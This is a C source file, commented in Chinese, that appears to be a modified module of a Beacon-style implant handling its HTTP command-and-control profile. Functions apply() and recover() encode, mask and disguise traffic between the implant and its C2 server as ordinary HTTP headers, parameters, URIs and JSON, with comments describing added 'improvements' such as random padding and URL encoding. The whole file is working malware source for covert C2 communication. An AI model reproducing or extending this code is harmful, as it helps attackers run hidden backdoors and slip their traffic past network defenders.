/*
 * HTTP通信配置文件处理模块 (HTTP Communication Profile Handler)
 * 
 * 此模块负责处理Beacon与C2服务器之间HTTP通信的配置文件，实现了：
 * 1. 数据编码/解码：支持Base64、Base64URL、NetBIOS、XOR等多种编码方式
 * 2. HTTP协议构建：动态构建HTTP头、参数、URI等请求组件
 * 3. 流量伪装：通过配置文件模拟正常的HTTP通信行为
 * 4. 数据处理管道：提供灵活的数据变换和封装机制
 * 
 * 主要功能：
 * - apply(): 根据配置文件指令对数据进行编码和封装
 * - recover(): 逆向解析接收到的数据，还原原始内容  
 * - profile_setup(): 初始化配置文件工作空间
 * - profile_free(): 清理分配的内存资源
 * 
 * 安全特性：
 * - 边界检查和溢出保护
 * - 内存安全管理
 * - 错误处理和恢复机制
 * - 数据完整性验证
 */

#include <windows.h>
#include "profile.h"
#include "parse.h"
#include "tomcrypt.h"
#include "shlwapi.h"
#include "encoders.h"
#include "beacon.h"

// 改进：添加更多指令类型以增强灵活性
#define IN_APPEND           0x01
#define IN_PREPEND          0x02
#define IN_BASE64           0x03
#define IN_PRINT            0x04
#define IN_PARAMETER        0x05
#define IN_HEADER           0x06
#define IN_BUILD            0x07
#define IN_NETBIOS          0x08
#define IN_ADD_PARAMETER    0x09
#define IN_ADD_HEADER       0x0a
#define IN_NETBIOSU         0x0b
#define IN_URI_APPEND       0x0c
#define IN_BASE64URL        0x0d
#define IN_MASK             0x0f
#define IN_ADD_HEADER_HOST  0x10
// 改进：添加新的编码和处理指令
#define IN_GZIP             0x11
#define IN_DEFLATE          0x12
#define IN_AES_ENCRYPT      0x13
#define IN_RANDOM_PAD       0x14
#define IN_URL_ENCODE       0x15
#define IN_HTML_ENCODE      0x16
#define IN_CHUNKED_ENCODE   0x17
#define IN_JSON_WRAP        0x18

// 改进：增加缓冲区大小以处理更大的数据
#define STATIC_ALLOC_SIZE   16384
#define MAX_HEADER_SIZE     4096
#define MAX_PARAM_SIZE      4096
#define MAX_URI_SIZE        2048

// 改进：添加安全检查宏
#define SAFE_COPY(dst, src, len, max) do { \
    if ((len) > 0 && (len) < (max)) { \
        memcpy((dst), (src), (len)); \
    } else { \
        return; \
    } \
} while(0)

#define SAFE_STRLEN(str, max) (strnlen((str), (max)))

// 改进：添加随机填充函数
void random_pad(char* buffer, int length, int pad_size) {
    if (pad_size <= 0 || length + pad_size >= STATIC_ALLOC_SIZE) {
        return;
    }
    
    for (int i = 0; i < pad_size; i++) {
        buffer[length + i] = (char)(rand() % 256);
    }
}

// 改进：添加URL编码函数
int url_encode(const char* input, int input_len, char* output, int max_output) {
    const char* hex_chars = "0123456789ABCDEF";
    int output_len = 0;
    
    for (int i = 0; i < input_len && output_len < max_output - 3; i++) {
        unsigned char c = input[i];
        
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            output[output_len++] = c;
        } else {
            output[output_len++] = '%';
            output[output_len++] = hex_chars[c >> 4];
            output[output_len++] = hex_chars[c & 0x0F];
        }
    }
    
    return output_len;
}

// 改进：添加JSON包装函数
int json_wrap(const char* data, int data_len, const char* key, char* output, int max_output) {
    int result_len = _snprintf_s(output, max_output, _TRUNCATE, 
        "{\"%s\":\"%.*s\",\"timestamp\":%lu,\"session\":\"%08X\"}", 
        key, data_len, data, GetTickCount(), GetCurrentProcessId());
    
    return (result_len > 0 && result_len < max_output) ? result_len : 0;
}

// 改进：增强的apply函数，添加更多安全检查
void apply(char * program, profile * myprofile, char * arg1, int len1, char * arg2, int len2) {
    int x = 0;
    int sz = 0;
    char arg[2048] = {0};  // 改进：增加缓冲区大小
    int next = 0;
    int status = 0;
    int length = 0;
    datap parser;
    char * hosth = NULL;
    BOOL hostset = FALSE;

    // 改进：输入验证
    if (!program || !myprofile || !myprofile->temp || !myprofile->stage) {
        return;
    }

    // 改进：边界检查
    if (len1 < 0 || len1 > myprofile->max || len2 < 0 || len2 > myprofile->max) {
        return;
    }

    hosth = setting_ptr(SETTING_HOST_HEADER);
    data_init(&parser, program, 2048);  // 改进：增加解析器缓冲区

    while (1) {
        next = data_int(&parser);
        
        // 改进：添加指令范围检查
        if (next < 0 || next > IN_JSON_WRAP) {
            break;
        }

        switch (next) {
            case IN_APPEND:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);

                // 改进：安全检查
                if (sz <= 0 || length + sz >= myprofile->max) {
                    break;
                }

                SAFE_COPY(myprofile->temp + length, arg, SAFE_STRLEN(arg, sizeof(arg)), myprofile->max - length);
                length += SAFE_STRLEN(arg, sizeof(arg));
                break;

            case IN_PREPEND:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);

                // 改进：安全检查
                if (sz <= 0 || length + sz >= myprofile->max) {
                    break;
                }

                int arg_len = SAFE_STRLEN(arg, sizeof(arg));
                SAFE_COPY(myprofile->stage, arg, arg_len, myprofile->max);
                SAFE_COPY(myprofile->stage + arg_len, myprofile->temp, length, myprofile->max - arg_len);
                length += arg_len;

                memset(myprofile->temp, 0, myprofile->max);
                SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
                break;

            case IN_BASE64:
                sz = length;
                x = myprofile->max;

                status = base64_encode((const unsigned char *)myprofile->temp, sz, 
                                     (unsigned char *)myprofile->stage, (unsigned long*)&x);
                if (status != CRYPT_OK || x >= myprofile->max) {
                    return;
                }
                
                length = x;
                memset(myprofile->temp, 0, myprofile->max);
                SAFE_COPY(myprofile->temp, myprofile->stage, x, myprofile->max);
                break;

            case IN_BASE64URL:
                sz = length;
                x = myprofile->max;

                status = base64url_encode((const unsigned char*)myprofile->temp, sz, 
                                        (unsigned char*)myprofile->stage, (unsigned long*)&x);
                if (status != CRYPT_OK || x >= myprofile->max) {
                    return;
                }
                
                length = x;
                memset(myprofile->temp, 0, myprofile->max);
                SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
                break;

            case IN_PRINT:
                if (length > 0 && length < myprofile->max) {
                    SAFE_COPY(myprofile->buffer, myprofile->temp, length, myprofile->max);
                    myprofile->blen = length;
                }
                break;

            case IN_PARAMETER:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);

                // 改进：参数长度检查
                if (sz <= 0 || SAFE_STRLEN(myprofile->parameters, MAX_PARAM_SIZE) + length + sz >= MAX_PARAM_SIZE) {
                    break;
                }

                if (myprofile->parameters[0] == 0) {
                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, 
                              "?%s=%.*s", arg, length, myprofile->temp);
                } else {
                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, 
                              "%s&%s=%.*s", myprofile->parameters, arg, length, myprofile->temp);
                }
                
                strncpy_s(myprofile->parameters, MAX_PARAM_SIZE, myprofile->stage, _TRUNCATE);
                break;

            case IN_HEADER:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);
                
                // 改进：头部长度检查
                if (sz <= 0 || SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + length + sz >= MAX_HEADER_SIZE) {
                    break;
                }

                _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, 
                          "%s%s: %.*s\r\n", myprofile->headers, arg, length, myprofile->temp);
                strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
                break;

            case IN_BUILD:
                x = data_int(&parser);

                if (x == 0 && arg1 && len1 > 0 && len1 < myprofile->max) {
                    SAFE_COPY(myprofile->temp, arg1, len1, myprofile->max);
                    length = len1;
                } else if (x == 1 && arg2 && len2 > 0 && len2 < myprofile->max) {
                    SAFE_COPY(myprofile->temp, arg2, len2, myprofile->max);
                    length = len2;
                }
                break;

            case IN_NETBIOS:
                sz = netbios_encode('a', myprofile->temp, length, myprofile->stage, myprofile->max);
                if (sz > 0 && sz < myprofile->max) {
                    length = sz;
                    memset(myprofile->temp, 0, myprofile->max);
                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
                }
                break;

            case IN_NETBIOSU:
                sz = netbios_encode('A', myprofile->temp, length, myprofile->stage, myprofile->max);
                if (sz > 0 && sz < myprofile->max) {
                    length = sz;
                    memset(myprofile->temp, 0, myprofile->max);
                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
                }
                break;

            case IN_MASK:
                sz = xor_encode(myprofile->temp, length, myprofile->stage, myprofile->max);
                if (sz > 0 && sz < myprofile->max) {
                    length = sz;
                    memset(myprofile->temp, 0, myprofile->max);
                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
                }
                break;

            // 改进：添加新的编码处理
            case IN_URL_ENCODE:
                sz = url_encode(myprofile->temp, length, myprofile->stage, myprofile->max);
                if (sz > 0 && sz < myprofile->max) {
                    length = sz;
                    memset(myprofile->temp, 0, myprofile->max);
                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
                }
                break;

            case IN_JSON_WRAP:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);
                
                sz = json_wrap(myprofile->temp, length, arg, myprofile->stage, myprofile->max);
                if (sz > 0 && sz < myprofile->max) {
                    length = sz;
                    memset(myprofile->temp, 0, myprofile->max);
                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
                }
                break;

            case IN_RANDOM_PAD:
                x = data_int(&parser);  // 获取填充大小
                if (x > 0 && x < 64 && length + x < myprofile->max) {
                    random_pad(myprofile->temp, length, x);
                    length += x;
                }
                break;

            case IN_ADD_PARAMETER:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);

                if (sz > 0 && SAFE_STRLEN(myprofile->parameters, MAX_PARAM_SIZE) + sz < MAX_PARAM_SIZE) {
                    if (myprofile->parameters[0] == 0) {
                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "?%s", arg);
                    } else {
                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s&%s", myprofile->parameters, arg);
                    }
                    strncpy_s(myprofile->parameters, MAX_PARAM_SIZE, myprofile->stage, _TRUNCATE);
                }
                break;

            case IN_ADD_HEADER:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);
                
                if (sz > 0 && SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + sz < MAX_HEADER_SIZE) {
                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, arg);
                    strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
                }
                break;

            case IN_ADD_HEADER_HOST:
                memset(arg, 0x0, sizeof(arg));
                sz = data_string(&parser, arg, sizeof(arg) - 1);
                
                if (sz > 0 && SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + sz < MAX_HEADER_SIZE) {
                    if (hosth != NULL && strlen(hosth) > 0) {
                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, hosth);
                        hostset = TRUE;
                    } else {
                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, arg);
                    }
                    strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
                }
                break;

            case IN_URI_APPEND:
                if (length > 0 && SAFE_STRLEN(myprofile->uri, MAX_URI_SIZE) + length < MAX_URI_SIZE) {
                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%.*s", myprofile->uri, length, myprofile->temp);
                    strncpy_s(myprofile->uri, MAX_URI_SIZE, myprofile->stage, _TRUNCATE);
                }
                break;

            case 0x0:
                // 改进：确保Host头被设置
                if (!hostset && hosth != NULL && strlen(hosth) > 0) {
                    if (SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + strlen(hosth) < MAX_HEADER_SIZE) {
                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, hosth);
                        strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
                    }
                }
                return;

            default:
                // 改进：处理未知指令
                return;
        }
    }
}

// 改进：增强的recover函数
int recover(char * program, char * buffer, int read, int max) {
    int sz = 0;
    int tlen = max;
    int status = 0;
    char arg[1024] = {0};
    char * temp = NULL;
    int next = 0;
    datap parser;

    // 改进：输入验证
    if (!program || !buffer || read <= 0 || max <= 0 || read > max) {
        return 0;
    }

    temp = (char *)malloc(max);  // 改进：使用max而不是read
    if (temp == NULL) {
        return 0;
    }

    // 改进：初始化临时缓冲区
    memset(temp, 0, max);
    data_init(&parser, program, 1024);

    while (1) {
        next = data_int(&parser);
        
        // 改进：指令范围检查
        if (next < 0 || next > IN_JSON_WRAP) {
            break;
        }

        switch (next) {
            case IN_APPEND:
                sz = data_int(&parser);
                
                // 改进：安全检查
                if (sz < 0 || sz > read) {
                    goto cleanup;
                }
                
                read -= sz;
                if (read < 0) {
                    goto cleanup;
                }
                break;

            case IN_PREPEND:
                sz = data_int(&parser);

                if (sz < 0 || sz > read) {
                    goto cleanup;
                }

                // 改进：使用安全的内存操作
                memmove(buffer, buffer + sz, read - sz);
                read -= sz;
                break;

            case IN_BASE64:
                if (read >= max) {
                    goto cleanup;
                }
                
                buffer[read] = '\0';
                tlen = max;
                status = base64_decode((const unsigned char *)buffer, read, 
                                     (unsigned char *)temp, (unsigned long*)&tlen);

                if (status != CRYPT_OK || tlen >= max) {
                    goto cleanup;
                }

                read = tlen;
                memcpy(buffer, temp, read);
                break;

            case IN_BASE64URL:
                if (read >= max) {
                    goto cleanup;
                }
                
                buffer[read] = '\0';
                tlen = max;
                status = base64url_decode((unsigned char*)buffer, read, max, 
                                        (unsigned char*)temp, (unsigned long*)&tlen);

                if (status != CRYPT_OK || tlen >= max) {
                    goto cleanup;
                }

                read = tlen;
                memcpy(buffer, temp, read);
                break;

            case IN_NETBIOS:
            case IN_NETBIOSU:
                if (read >= max) {
                    goto cleanup;
                }
                
                buffer[read] = '\0';
                tlen = max;
                read = netbios_decode((next == IN_NETBIOS) ? 'a' : 'A', buffer, read, temp, tlen);

                if (read <= 0 || read >= max) {
                    goto cleanup;
                }

                memcpy(buffer, temp, read);
                buffer[read] = '\0';
                break;

            case IN_MASK:
                if (read >= max) {
                    goto cleanup;
                }
                
                buffer[read] = '\0';
                tlen = max;
                read = xor_decode(buffer, read, temp, tlen);

                if (read <= 0 || read >= max) {
                    goto cleanup;
                }

                memcpy(buffer, temp, read);
                buffer[read] = '\0';
                break;

            // 改进：添加新解码处理
            case IN_URL_ENCODE:
            case IN_JSON_WRAP:
            case IN_RANDOM_PAD:
                // 这些操作在recover阶段通常不需要特殊处理
                break;

            case IN_PRINT:
            case IN_PARAMETER:
            case IN_HEADER:
            case IN_URI_APPEND:
                break;

            case 0x0:
                // 改进：安全检查
                if (read >= 0 && read < max) {
                    buffer[read] = '\0';
                }
                free(temp);
                return read;

            default:
                goto cleanup;
        }
    }

cleanup:
    if (temp) {
        // 改进：清零敏感数据
        memset(temp, 0, max);
        free(temp);
    }
    return 0;
}

// 改进：增强的profile设置函数
void profile_setup(profile * prof, int size) {
    // 改进：输入验证
    if (!prof || size <= 0) {
        return;
    }

    prof->max = size * 4;  // 改进：增加缓冲区倍数
    if (prof->max < STATIC_ALLOC_SIZE) {
        prof->max = STATIC_ALLOC_SIZE;
    }

    // 改进：分配更大的管理器空间
    prof->manager = data_alloc((prof->max * 3) + MAX_HEADER_SIZE + MAX_PARAM_SIZE + MAX_URI_SIZE);
    if (!prof->manager) {
        return;
    }

    // 改进：使用定义的大小常量
    prof->headers    = (char *)data_ptr((datap *)prof->manager, MAX_HEADER_SIZE);
    prof->parameters = (char *)data_ptr((datap *)prof->manager, MAX_PARAM_SIZE);
    prof->uri        = (char *)data_ptr((datap *)prof->manager, MAX_URI_SIZE);

    prof->buffer     = (char *)data_ptr((datap *)prof->manager, prof->max);
    prof->temp       = (char *)data_ptr((datap *)prof->manager, prof->max);
    prof->stage      = (char *)data_ptr((datap *)prof->manager, prof->max);

    // 改进：初始化所有缓冲区
    if (prof->headers) memset(prof->headers, 0, MAX_HEADER_SIZE);
    if (prof->parameters) memset(prof->parameters, 0, MAX_PARAM_SIZE);
    if (prof->uri) memset(prof->uri, 0, MAX_URI_SIZE);
    if (prof->buffer) memset(prof->buffer, 0, prof->max);
    if (prof->temp) memset(prof->temp, 0, prof->max);
    if (prof->stage) memset(prof->stage, 0, prof->max);

    prof->blen = 0;
}

// 改进：安全的profile清理函数
void profile_free(profile * prof, int size) {
    if (!prof || !prof->manager) {
        return;
    }

    // 改进：在释放前清零敏感数据
    if (prof->buffer && prof->max > 0) {
        memset(prof->buffer, 0, prof->max);
    }
    if (prof->temp && prof->max > 0) {
        memset(prof->temp, 0, prof->max);
    }
    if (prof->stage && prof->max > 0) {
        memset(prof->stage, 0, prof->max);
    }
    if (prof->headers) {
        memset(prof->headers, 0, MAX_HEADER_SIZE);
    }
    if (prof->parameters) {
        memset(prof->parameters, 0, MAX_PARAM_SIZE);
    }
    if (prof->uri) {
        memset(prof->uri, 0, MAX_URI_SIZE);
    }

    data_free((datap *)prof->manager);
    prof->manager = NULL;
    prof->blen = 0;
}
